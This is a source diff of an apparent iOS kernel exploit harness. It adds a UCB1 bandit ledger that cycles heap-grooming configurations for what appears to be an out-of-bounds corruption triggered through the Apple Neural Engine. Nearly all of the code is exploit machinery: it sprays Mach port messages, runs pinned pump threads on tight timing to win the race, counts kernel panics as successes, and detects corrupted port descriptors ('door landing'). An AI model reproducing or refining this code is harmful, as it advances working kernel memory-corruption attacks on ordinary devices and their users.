@@ -29,11 +29,13 @@
 #import <mach/mach_error.h>
 #import <mach/thread_policy.h>
 #import <pthread.h>
+#import <sys/sysctl.h>
+#import <sys/time.h>
 #import <CoreFoundation/CoreFoundation.h>
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v21-bulletwin"
+#define P099_BUILD @"p099-aneprewire-v22-bandit"
 
 #define P099_INPUT_COUNT 254
 /* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
@@ -354,6 +356,53 @@ static void p099_fire_pump(uint32_t batch) {
    land on a different CPU's magazine than the ANE's pop, so pump kmsgs can
    NEVER be neighbors of the crossing element. Pin the tap thread AND the
    pump thread to the same affinity tag = one magazine for the whole race. */
+
+/* v22 ARM LAW — the whole v13..v21 steer configuration becomes
+   RUNTIME-SELECTABLE through the existing dial file (Documents/p099_victim.txt),
+   so ONE IPA sweeps the config space across reboot cycles and the dial stops
+   needing rebuilds:
+     interleave   = the v13 half-drain + even-hole-door shape ALONE. The groom
+                    base, default ON in EVERY arm (the even/odd hole door
+                    shape is built unconditionally below); this arm adds nothing.
+     reclaim      = + the v15 reclaim-pump (kept-8 LIFO free slots stay the
+                    ANE's pop set). Runs in every arm EXCEPT interleave, or
+                    when the dial pins kept= explicitly (v13+kept shape).
+     fireburst    = + the v17 per-attempt p099_fire_pump(burst) WITHOUT a
+                    pump thread (unpinned — v17's own loss law).
+     thread       = + the v18 UNPINNED pump thread (calibration arm).
+     pinnedburst  = + the v19/v20 PINNED pump thread (same-CPU magazine law).
+     bullet       = the current v21 = pinned pump thread + per-attempt burst +
+                    2 claims per <cadence>µs. DIAL DEFAULT (backward-compat).
+   The p099_pin() calls (tap thread + pump thread) gate on arm in
+   {pinnedburst, bullet} per the v19/v21 laws. The ledger/UCB1 side (which
+   needs Foundation) lives in the v22 section below; these C globals lead. */
+#define P099_ARM_INTERLEAVE  0
+#define P099_ARM_RECLAIM     1
+#define P099_ARM_FIREBURST   2
+#define P099_ARM_THREAD      3
+#define P099_ARM_PINNEDBURST 4
+#define P099_ARM_BULLET      5
+#define P099_ARM_N           6
+static const char *const p099_armNames[P099_ARM_N] = {
+    "interleave", "reclaim", "fireburst", "thread", "pinnedburst", "bullet"
+};
+static int      g_p099_arm = P099_ARM_BULLET;   /* dial default = bullet (backward-compat) */
+static BOOL     g_p099_armDialPinned = NO;      /* arm= present in the dial = force, UCB1 skipped */
+static uint32_t g_p099_kept    = 8u;            /* v15 top-kept free slots (kept= default 8) */
+static BOOL     g_p099_keptExplicit = NO;       /* kept= present -> reclaim even on interleave */
+static uint32_t g_p099_cadence = 5u;            /* v21: 2 claims per <cadence>µs (default 5) */
+static uint32_t g_p099_burst   = 8u;            /* v17/v20 per-attempt burst (default 8) */
+static BOOL     g_p099_reclaimOn = YES;         /* v15 pump gate: arm != interleave, or kept= present */
+
+static BOOL p099_arm_pinned(int arm) {
+    return arm == P099_ARM_PINNEDBURST || arm == P099_ARM_BULLET;
+}
+static BOOL p099_arm_thread(int arm) {
+    return arm == P099_ARM_THREAD || arm == P099_ARM_PINNEDBURST || arm == P099_ARM_BULLET;
+}
+static BOOL p099_arm_burst(int arm) {
+    return arm == P099_ARM_FIREBURST || arm == P099_ARM_PINNEDBURST || arm == P099_ARM_BULLET;
+}
 static void p099_pin(void) {
     thread_affinity_policy_data_t aff;
     aff.affinity_tag = 1;
@@ -362,8 +411,11 @@ static void p099_pin(void) {
     (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
 }
 static volatile int g_p099_pumpRun;
+/* v22: the pump-thread pin gates on arm — 'thread' stays the UNPINNED v18
+   calibration arm; 'pinnedburst'/'bullet' keep the v19 same-magazine law. */
+static volatile int g_p099_pumpPin = 1;
 static void *p099_pump_thread(void *unused) {
-    p099_pin();   /* v19: same magazine as the fire */
+    if (g_p099_pumpPin) p099_pin();   /* v19 same-magazine law, v22-gated */
     while (g_p099_pumpRun) {
         p099_fire_pump(2);
         /* v21 BULLET CADENCE (the bridge law, 23F77 carve): the fill's own
@@ -373,8 +425,9 @@ static void *p099_pump_thread(void *unused) {
            The claim must pop the stack head INSIDE the fire's own
            [R-alloc → rec-192] window = ~10µs pops at ≥1/10µs — a sustained
            same-CPU bullet pump through the WHOLE synchronous send, holding
-           all victims (the per-attempt bursts were early; 4/25ms too slow). */
-        usleep(5);
+           all victims (the per-attempt bursts were early; 4/25ms too slow).
+           v22: the cadence is the dial (default 5µs). */
+        usleep(g_p099_cadence);
     }
     return NULL;
 }
@@ -473,6 +526,270 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
     if (smashes) L(@"[v7] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
 }
 
+#pragma mark - v22 bandit arms + ledger (UCB1 over Documents/p099_bandit.json)
+
+/* The arm constants/globals/gate-helpers live above the pump thread (single
+   globals site, C-only). This section is the ledger + UCB1 side.
+   ---- THE LEDGER: Documents/p099_bandit.json ------------------------------
+   {"seeded_from": "...", "boot_id": <kern.boottime sec>,
+    "last_arm": "bullet", "round_open": true/false, "last_outcome": "...",
+    "arms": {"<name>": {"maf","lost","nofire","door","abort" counts}},
+    "history": [ last 20 {t, arm, outcome} ]}
+   Outcome law:
+     door   = the door-verdict path set it before exit (dvSmash > 0)
+     maf    = the NEXT session detected a panic happened last session — the
+              note-270 §3 attribution-law analog ("a post-panic reboot's
+              fsync'd log names the in-flight round"): a dirty boot with the
+              round still open = the previous session PANICKED mid-round =
+              credited to last_arm. Implemented CONSERVATIVELY: maf only when
+              kern.boottime CHANGED since the open round (this tap IS the
+              first post-reboot tap) AND round_open — else "lost" (a same-boot
+              force-quit is no panic evidence; an unreadable boottime credits
+              nothing). "nofire" = the NO FIRE verdict path only.
+     lost   = the door totals zero (fired, no desc crossings) OR a
+              same-boot mid-round death (conservative).
+   UCB1 (Auer 2002) pick at tap start: arm = argmax(mean + sqrt(2 ln N / n_i)).
+   Reward law: maf + door = 1 (the OOB fired / the door landed), nofire +
+   lost = 0, abort = 0.5 (half-loss). Priors seeded from the KNOWN history. */
+
+static NSMutableDictionary *g_p099_banditLed;   /* this tap's live ledger */
+static NSString *g_p099_banditPath;
+static NSString *g_p099_banditArm;
+
+static NSString *p099_ledger_path(NSString *docs) {
+    return [docs stringByAppendingPathComponent:@"p099_bandit.json"];
+}
+
+/* v22 dial token helpers: "key=<word>" / "key=<int>" anywhere in the dial
+   text (p099_dial_int keeps the existing portkind= substring law: intValue
+   stops at the first non-digit). */
+static NSString *p099_dial_word(NSString *dial, NSString *key) {
+    NSRange r = [dial rangeOfString:key];
+    if (r.location == NSNotFound) return nil;
+    NSUInteger s = NSMaxRange(r), e = s;
+    while (e < dial.length) {
+        unichar c = [dial characterAtIndex:e];
+        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))) break;
+        e++;
+    }
+    if (e == s) return nil;
+    return [[dial substringWithRange:NSMakeRange(s, e - s)] lowercaseString];
+}
+static int p099_dial_int(NSString *dial, NSString *key) {
+    NSRange r = [dial rangeOfString:key];
+    if (r.location == NSNotFound) return -1;
+    return [dial substringFromIndex:NSMaxRange(r)].intValue;
+}
+
+static uint64_t p099_boot_id(void) {
+    struct timeval tv; size_t sz = sizeof tv;
+    if (sysctlbyname("kern.boottime", &tv, &sz, NULL, 0) == 0 && tv.tv_sec > 0)
+        return (uint64_t)tv.tv_sec;
+    return 0;
+}
+
+/* note-267 ledger priors — APPROXIMATE, honestly labeled in the json. */
+static NSDictionary *p099_arm_seed(int arm) {
+    switch (arm) {
+        case P099_ARM_BULLET:      return @{@"maf":@5u, @"lost":@0u, @"nofire":@1u, @"door":@0u, @"abort":@0u};
+        case P099_ARM_PINNEDBURST: return @{@"maf":@0u, @"lost":@0u, @"nofire":@0u, @"door":@0u, @"abort":@1u};
+        case P099_ARM_THREAD:      return @{@"maf":@2u, @"lost":@0u, @"nofire":@0u, @"door":@0u, @"abort":@0u};
+        case P099_ARM_FIREBURST:   return @{@"maf":@2u, @"lost":@0u, @"nofire":@0u, @"door":@0u, @"abort":@0u};
+        case P099_ARM_RECLAIM:     return @{@"maf":@5u, @"lost":@0u, @"nofire":@0u, @"door":@0u, @"abort":@0u};
+        default:                   return @{@"maf":@2u, @"lost":@0u, @"nofire":@0u, @"door":@0u, @"abort":@0u};
+    }
+}
+
+static NSMutableDictionary *p099_ledger_fresh(void) {
+    NSMutableDictionary *arms = [NSMutableDictionary dictionary];
+    for (int a = 0; a < P099_ARM_N; a++)
+        arms[@(p099_armNames[a])] = [NSMutableDictionary dictionaryWithDictionary:p099_arm_seed(a)];
+    NSMutableDictionary *led = [NSMutableDictionary dictionary];
+    led[@"seeded_from"] = @"note-267 ledger (approximate priors, honestly labeled; bullets: \
+bullet{maf5,nofire1} pinnedburst{abort1=half-loss} thread{maf2} fireburst{maf2} \
+reclaim{maf5} interleave{maf2})";
+    led[@"seed_values"] = @{
+        @"bullet":      @{@"maf":@5u, @"nofire":@1u},
+        @"pinnedburst": @{@"abort":@1u},
+        @"thread":      @{@"maf":@2u},
+        @"fireburst":   @{@"maf":@2u},
+        @"reclaim":     @{@"maf":@5u},
+        @"interleave":  @{@"maf":@2u},
+    };
+    led[@"boot_id"] = @(p099_boot_id());
+    led[@"last_arm"] = @"";
+    led[@"round_open"] = @NO;
+    led[@"arms"] = arms;
+    led[@"history"] = [NSMutableArray array];
+    return led;
+}
+
+static uint32_t p099_arm_count(NSDictionary *a, NSString *k) {
+    NSNumber *n = a[k];
+    return n ? n.unsignedIntValue : 0u;
+}
+
+static NSMutableDictionary *p099_ledger_load(NSString *path, BOOL *freshOut) {
+    NSData *d = [NSData dataWithContentsOfFile:path];
+    if (d) {
+        id j = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
+        if ([j isKindOfClass:[NSDictionary class]]) {
+            if (freshOut) *freshOut = NO;
+            return [j mutableCopy];
+        }
+    }
+    if (freshOut) *freshOut = YES;
+    return p099_ledger_fresh();
+}
+
+/* POSIX f_fullsync on the json after the atomic write — the log law. */
+static BOOL p099_ledger_save(NSDictionary *led, NSString *path) {
+    if (!led || !path) return NO;
+    NSData *out = [NSJSONSerialization dataWithJSONObject:led
+                                                  options:NSJSONWritingSortedKeys
+                                                    error:nil];
+    if (!out || ![out writeToFile:path options:NSDataWritingAtomic error:nil]) return NO;
+    int fd = open(path.fileSystemRepresentation, O_RDONLY);
+    if (fd >= 0) { (void)fcntl(fd, F_FULLFSYNC); (void)close(fd); }
+    return YES;
+}
+
+/* mutable-enforcement: a loaded json's nested collections are immutable —
+   promote before every mutation. */
+static void p099_ledger_bump(NSMutableDictionary *led, NSString *arm, NSString *outcome) {
+    if (![led isKindOfClass:[NSMutableDictionary class]]) return;
+    NSMutableDictionary *arms = led[@"arms"];
+    if (![arms isKindOfClass:[NSMutableDictionary class]]) {
+        arms = [arms mutableCopy];
+        led[@"arms"] = arms;
+    }
+    if (!arms) { arms = [NSMutableDictionary dictionary]; led[@"arms"] = arms; }
+    NSMutableDictionary *a = arms[arm];
+    if (![a isKindOfClass:[NSMutableDictionary class]]) {
+        a = a ? [a mutableCopy] : [NSMutableDictionary dictionary];
+        arms[arm] = a;
+    }
+    uint32_t c = p099_arm_count(a, outcome) + 1u;
+    a[outcome] = @(c);
+    NSMutableArray *h = led[@"history"];
+    if (![h isKindOfClass:[NSMutableArray class]]) {
+        h = h ? [h mutableCopy] : [NSMutableArray array];
+        led[@"history"] = h;
+    }
+    [h addObject:@{ @"t": LabLocalMilitaryNow() ?: @"?", @"arm": arm ?: @"?", @"outcome": outcome ?: @"?" }];
+    while (h.count > 20) [h removeObjectAtIndex:0];
+}
+
+/* UCB1 pick. scoreOut (optional) gets the readable per-arm line. */
+static int p099_bandit_pick(NSMutableDictionary *led, NSMutableString *scoreOut) {
+    NSMutableDictionary *arms = led[@"arms"];
+    uint32_t nArm[P099_ARM_N];
+    double mean[P099_ARM_N];
+    double nTotal = 0;
+    for (int i = 0; i < P099_ARM_N; i++) {
+        NSDictionary *a = arms[@(p099_armNames[i])];
+        double maf = p099_arm_count(a, @"maf"), door = p099_arm_count(a, @"door");
+        double lost = p099_arm_count(a, @"lost"), nof = p099_arm_count(a, @"nofire");
+        double ab  = p099_arm_count(a, @"abort");
+        double n = maf + door + lost + nof + ab;
+        double reward = maf + door + 0.5 * ab;
+        nArm[i] = (uint32_t)(n + 0.5);
+        mean[i] = n > 0 ? reward / n : 0.0;
+        nTotal += n;
+    }
+    double lg = log(nTotal > 1.0 ? nTotal : 2.0);
+    int best = P099_ARM_BULLET;
+    double bestV = -1e300;
+    for (int i = 0; i < P099_ARM_N; i++) {
+        double expl = nArm[i] > 0 ? sqrt(2.0 * lg / (double)nArm[i]) : 1e9;
+        double ucb = mean[i] + expl;
+        if (scoreOut) {
+            [scoreOut appendFormat:@"%s n=%u mean=%.3f ucb=%.3f%@",
+             p099_armNames[i], nArm[i], mean[i], ucb,
+             (i == P099_ARM_N - 1) ? @"" : @" | "];
+        }
+        if (ucb > bestV) { bestV = ucb; best = i; }
+    }
+    return best;
+}
+
+/* tap start: load (or seed) the ledger, run the note-270 §3-style MAF
+   attribution for last session, pick the arm (UCB1 unless the dial pins
+   arm=), stamp the open round, save. */
+static void p099_bandit_tapstart(NSString *docs, NSString *stampWarn) {
+    g_p099_banditPath = p099_ledger_path(docs);
+    BOOL fresh = NO;
+    g_p099_banditLed = p099_ledger_load(g_p099_banditPath, &fresh);
+    uint64_t bootNow  = p099_boot_id();
+    uint64_t bootPrev = [g_p099_banditLed[@"boot_id"] unsignedLongLongValue];  /* nil -> 0 */
+    g_p099_banditLed[@"boot_id"] = @(bootNow);
+    if (fresh)
+        L(@"[v22] ledger SEEDED (approximate note-267 priors, honestly labeled; json=%@)",
+          g_p099_banditPath);
+
+    /* ---- MAF attribution (note-270 §3 precedent: "if the device reboots on
+       the in-flight line, the outcome names the round"). A dirty boot with
+       the round still open = last session panicked mid-round. CONSERVATIVE:
+       maf ONLY on a provable boot change; same-boot/unknown -> lost. ---- */
+    NSString *lastArm = g_p099_banditLed[@"last_arm"];
+    if (![lastArm isKindOfClass:[NSString class]]) lastArm = nil;
+    BOOL wasOpen = [g_p099_banditLed[@"round_open"] boolValue];
+    if (lastArm.length > 0 && wasOpen) {
+        BOOL bootChanged = (bootPrev != 0 && bootNow != 0 && bootPrev != bootNow);
+        if (bootChanged) {
+            p099_ledger_bump(g_p099_banditLed, lastArm, @"maf");
+            L(@"[v22] MAF ATTRIBUTION: boot %llu -> %llu with the %@ round still "
+              @"open -> last session PANICKED mid-round (maf credited to %@; "
+              @"stamp law: %@)", bootPrev, bootNow, lastArm, lastArm,
+              stampWarn ?: @"no prior stamp");
+        } else {
+            p099_ledger_bump(g_p099_banditLed, lastArm, @"lost");
+            L(@"[v22] conservative attribution: %@ round was open but boot "
+              @"unchanged/unknown (%llu -> %llu) -> lost (no panic evidence; "
+              @"stamp law: %@)", lastArm, bootPrev, bootNow, stampWarn ?: @"no prior stamp");
+        }
+        g_p099_banditLed[@"round_open"] = @NO;
+    }
+
+    g_p099_reclaimOn = (g_p099_arm != P099_ARM_INTERLEAVE) || g_p099_keptExplicit;
+
+    /* ---- the pick (UCB1 unless the dial pins arm=) ---- */
+    if (g_p099_armDialPinned) {
+        L(@"[v22] dial pins arm=%s — UCB1 SKIPPED this tap (calibration)", p099_armNames[g_p099_arm]);
+    } else {
+        NSMutableString *sc = [NSMutableString string];
+        g_p099_arm = p099_bandit_pick(g_p099_banditLed, sc);
+        L(@"[v22] UCB1 %@", sc);
+    }
+    g_p099_banditArm = @(p099_armNames[g_p099_arm]);
+    g_p099_banditLed[@"last_arm"] = g_p099_banditArm;
+    g_p099_banditLed[@"round_open"] = @YES;
+    if (!p099_ledger_save(g_p099_banditLed, g_p099_banditPath))
+        L(@"[v22] ledger SAVE FAILED (json=%@) — attribution this round may be lost "
+          @"if the device panics", g_p099_banditPath);
+
+    /* THE BANNER (mandated shape) */
+    L(@"[v22] bandit: arm=%s kept=%u cadence=%uus burst=%u (UCB1 over the p099 ledger; json=%s)",
+      p099_armNames[g_p099_arm], g_p099_kept, g_p099_cadence, g_p099_burst,
+      g_p099_banditPath.fileSystemRepresentation ?: "(?)");
+    if (g_p099_armDialPinned)
+        L(@"[v22] note: arm came from the dial pin, not the UCB1 argmax");
+}
+
+/* verdict / door-verdict paths call this before exit. */
+static void p099_bandit_close(NSString *outcome) {
+    if (!g_p099_banditLed || !g_p099_banditArm) return;
+    p099_ledger_bump(g_p099_banditLed, g_p099_banditArm, outcome);
+    g_p099_banditLed[@"round_open"] = @NO;
+    g_p099_banditLed[@"last_outcome"] = outcome;
+    g_p099_banditLed[@"boot_id"] = @(p099_boot_id());
+    if (p099_ledger_save(g_p099_banditLed, g_p099_banditPath))
+        L(@"[v22] ledger closed: arm=%@ outcome=%@ (json=%@)",
+          g_p099_banditArm, outcome, g_p099_banditPath);
+    else
+        L(@"[v22] ledger SAVE FAILED (json=%@) — outcome only in this log", g_p099_banditPath);
+}
+
 @implementation P099AnePrewireGroom
 
 + (NSString *)tap {
@@ -506,11 +823,13 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
         L(@"One evaluation. STANDALONE ONLY - not in PATCH chain.");
         L(@"Probe app: fire even on fill_cap / unknown SKU. Public Lum1na is the SKU gate.");
         L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
-        L(@"%@", [LabDeviceProfile huntTapWarn:@"p099"] ?: @"");
+        NSString *p099stampWarn = [LabDeviceProfile huntTapWarn:@"p099"];
+        L(@"%@", p099stampWarn ?: @"");
         [LabDeviceProfile stampLastTap:@"p099"];
 
         // ---- v6 dial: Documents/p099_victim.txt "portkind=N" (last N victims as door rounds) ----
-        p099_pin();   /* v19: the tap's main thread = the pump's magazine */
+        /* v22: the p099_pin() call moved BELOW the bandit pick — it gates on
+           arm in {pinnedburst, bullet} (v19/v21 law). */
         g_p099_portkindN = 0;
         {
             NSString *dialP = [docs stringByAppendingPathComponent:@"p099_victim.txt"];
@@ -548,9 +867,50 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                     int v = [dial substringFromIndex:NSMaxRange(r)].intValue;
                     if (v > 0 && v <= (int)P099_PAIR_COUNT) g_p099_portkindN = (uint32_t)v;
                 }
+                /* v22: arm= / kept= / cadence= / burst= — the whole v13..v21
+                   steer config on the SAME dial file, so one IPA sweeps the
+                   config space across reboot cycles and the dial stops
+                   needing rebuilds. Defaults: arm=bullet (backward-compat),
+                   kept=8, cadence=5, burst=8. arm= present = PIN (UCB1
+                   skipped, calibration). */
+                NSString *aw = p099_dial_word(dial, @"arm=");
+                if (aw) {
+                    int found = -1;
+                    for (int a = 0; a < P099_ARM_N; a++)
+                        if ([aw isEqualToString:@(p099_armNames[a])]) { found = a; break; }
+                    if (found >= 0) {
+                        g_p099_arm = found;
+                        g_p099_armDialPinned = YES;
+                    } else {
+                        L(@"[v22] dial arm=%@ UNKNOWN — ignored (valid: interleave/reclaim/"
+                          @"fireburst/thread/pinnedburst/bullet; UCB1 pick stands)", aw);
+                    }
+                }
+                {
+                    int kv = p099_dial_int(dial, @"kept=");
+                    if (kv > 0 && kv <= (int)P099_PAIR_COUNT) {
+                        g_p099_kept = (uint32_t)kv;
+                        g_p099_keptExplicit = YES;
+                    }
+                    int cv = p099_dial_int(dial, @"cadence=");
+                    if (cv > 0 && cv <= 100000) g_p099_cadence = (uint32_t)cv;
+                    int bv = p099_dial_int(dial, @"burst=");
+                    if (bv > 0 && bv <= (int)P099_PUMP_PORTS) g_p099_burst = (uint32_t)bv;
+                }
                 L(@"[v6] dial portkind=%u (Documents/p099_victim.txt; last %u victims = door rounds)",
                   g_p099_portkindN, g_p099_portkindN);
+                L(@"[v22] dial parsed: arm=%s%@ kept=%u%@ cadence=%uus burst=%u",
+                  p099_armNames[g_p099_arm], g_p099_armDialPinned ? @"" : @" (UCB1 decides)",
+                  g_p099_kept, g_p099_keptExplicit ? @" (explicit)" : @" (default)",
+                  g_p099_cadence, g_p099_burst);
             }
+        }
+
+        // ---- v22 bandit: ledger + MAF attribution + UCB1 pick (Documents/p099_bandit.json) ----
+        p099_bandit_tapstart(docs, p099stampWarn);
+        if (p099_arm_pinned(g_p099_arm)) {
+            p099_pin();   /* v19/v22: the pin gates on arm in {pinnedburst, bullet};
+                             the tap's main thread = the pump's magazine */
         }
         if ([LabDeviceProfile aneFillCapped]) {
             L(@"EXPECT-BAD fill_cap=1. 254-in CheckandPrewire on this SKU -> 0xe00002c2. Probe still fires.");
@@ -603,22 +963,27 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 if ((i & 1) && pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
             }
             /* v15 RECLAIM-PUMP: resend a door msg to every drained odd-hole
-               port EXCEPT the top-8 LIFO ranks — frees stay tiny and out of
-               the stream's path; everything downstream of the record area's
-               element = LIVE door kmsgs. */
-            {
-                uint32_t reclaimed = 0, kept = 8u;
+               port EXCEPT the top-<kept> LIFO ranks — frees stay tiny and out
+               of the stream's path; everything downstream of the record
+               area's element = LIVE door kmsgs. v22: the pump gates on arm —
+               runs when arm != interleave, or when the dial pins kept=
+               explicitly (the v13+kept shape). */
+            if (g_p099_reclaimOn) {
+                uint32_t reclaimed = 0, kept = g_p099_kept;
+                if (kept >= (P099_PAIR_COUNT >> 1)) kept = (P099_PAIR_COUNT >> 1) - 1u;  /* keep >=1 free */
                 for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                     if (!(i & 1) || !pairs[i].hole) continue;
                     if ((i >> 1) >= (P099_PAIR_COUNT >> 1) - kept) continue;  /* top-k stay free */
                     if (p099_send_portkind_victim(pairs[i].hole, i)) reclaimed++;
                 }
                 if (g_p099_portkindN == P099_PAIR_COUNT)
-                    L(@"[v15] reclaim-pump: %u freed slots re-claimed with door kmsgs (kept=%u free = the ANE's pop set)",
-                      reclaimed, kept);
+                    L(@"[v15] reclaim-pump: %u freed slots re-claimed with door kmsgs (arm=%s kept=%u free = the ANE's pop set)",
+                      reclaimed, p099_armNames[g_p099_arm], kept);
                 /* v17: pre-make the fire-window pump ports (send at fire time) */
                 for (uint32_t k = 0; k < P099_PUMP_PORTS; k++)
                     g_p099_pumpPorts[k] = p099_make_port();
+            } else {
+                L(@"[v22] arm=interleave: NO reclaim-pump (pure v13/v14 half-drain shape)");
             }
         }
         sync();
@@ -706,12 +1071,34 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                                 L(@"[fire %d] model reloaded (fresh ANE compile session)", t);
                             }
                             err = nil;
-                            if (!t) { p099_pump_start(); L(@"[v21] bullet pump SAME-CPU: ~2 claims/5µs held through the whole synchronous send (the [R,B,A] rotation law — claim the stack head INSIDE the fire window; 23F77 alloc-map law)"); }
+                            /* v22: the pump-mode switch — thread arms start the
+                               pump thread (v18/v19/v21 law; the pin gates on
+                               arm in {pinnedburst, bullet}), burst arms fire
+                               the per-attempt pump (v17/v20/v21 law),
+                               interleave/reclaim fire neither. */
+                            if (!t) {
+                                if (p099_arm_thread(g_p099_arm)) {
+                                    g_p099_pumpPin = p099_arm_pinned(g_p099_arm) ? 1 : 0;
+                                    p099_pump_start();
+                                    L(@"[v22] pump thread ON (arm=%s, %s): ~2 claims/%uµs held through the whole synchronous send (the [R,B,A] rotation law — claim the stack head INSIDE the fire window; 23F77 alloc-map law)",
+                                      p099_armNames[g_p099_arm],
+                                      g_p099_pumpPin ? "PINNED same-CPU" : "UNPINNED v18 calibration",
+                                      g_p099_cadence);
+                                } else {
+                                    L(@"[v22] no pump thread (arm=%s)%s",
+                                      p099_armNames[g_p099_arm],
+                                      p099_arm_burst(g_p099_arm) ?
+                                        @" — per-attempt burst only (v17 shape)" : @"");
+                                }
+                            }
                             /* v20: the last untested combination — v17's per-attempt
                                burst WITH the v19 same-CPU pin (v17's own loss was
                                the UNPINNED pump; four steer laws each produced the
-                               same rec0xc0 MAF, this pair is the remaining shape). */
-                            p099_fire_pump(8);
+                               same rec0xc0 MAF, this pair is the remaining shape).
+                               v22: the burst gates on arm in {fireburst,
+                               pinnedburst, bullet} and sizes from the dial
+                               (default 8). */
+                            if (p099_arm_burst(g_p099_arm)) p099_fire_pump(g_p099_burst);
                             id<MLFeatureProvider> pred =
                                 [model predictionFromFeatures:provider error:&err];
                             if (pred) {
@@ -825,6 +1212,7 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
         if (!evaluated) {
             L(@"[-] no evaluation fired (both routes missed) - honest miss, no OOB, no panic.");
             L(@"=== VERDICT: NO FIRE ===");
+            p099_bandit_close(@"nofire");   /* v22 ledger: NO FIRE verdict -> this arm */
             goto finish;
         }
 
@@ -941,6 +1329,11 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 L(@"[+] DOOR LANDING: the record stream crossed IN-FLIGHT door kmsgs (descriptors above)");
             else if (g_p099_dvRead > 0)
                 L(@"[-] door: zero desc crossings — landing element was free/other (MAF attests ~25s) or the program was rejected");
+            /* v22 ledger: the door-verdict path sets the outcome before exit —
+               "door" when the door landing landed, "lost" when the door totals
+               are zero (a mid-round device panic leaves the round OPEN in the
+               json instead: the NEXT tap attributes maf via the boot stamp). */
+            p099_bandit_close((g_p099_dvSmash > 0) ? @"door" : @"lost");
         }
 
 finish:
